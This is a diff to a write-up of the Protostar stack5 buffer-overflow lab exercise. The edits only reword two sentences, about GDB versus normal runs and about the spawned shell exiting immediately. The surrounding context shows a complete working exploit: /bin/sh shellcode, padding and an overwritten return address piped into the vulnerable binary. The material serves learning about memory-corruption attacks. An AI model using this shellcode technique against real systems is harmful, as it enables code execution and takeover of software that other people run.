@@ -498,7 +498,7 @@ Great! So our exploit works in GDB, lets try it outside of the debugger--
 python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'" | ./stack5                                                                                                                                                                                                  
 Illegal instruction (core dumped)   #not so fast!
 ``` 
-So what happened? Well, there are some differences in how the program runs when you run it normally and within GDB. 
+So what happened? Well, there are some differences in how the program runs when you run it normally and within GDB (guessing due to env variables, a wrapper will also fix this ). 
 So we will take a look at the core dump to see what's going on and see where exactly everything sits in memory when a user runs the program.
 ```bash
 $ python -c "print 'a'*76+'xxxx'" | ./stack5
@@ -531,12 +531,12 @@ So we alter our input with the new memory locations, and come up with an input l
 ```bash
 $ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
 ```
-Now for some weirdness . I was stuck for a while on this part, because if you run this
+Now for some weirdness . I was stuck for a while on this part, because if you run 
 ```bash
 $ cat stack5sploit | ./stack5
 $ 
 ```
-Nothing happens. After some research, I found a few solutions. Apparently shell redirection "<"
+We're getting our shell , but it exits immediately. After some research, I found a few solutions. Apparently shell redirection "<"
 appends an EOF after redirecting payload5.
 You can choose a different shellcode, or use the following trick. (thanks http://www.kroosec.com/2012/12/protostar-stack5.html)
 ```bash
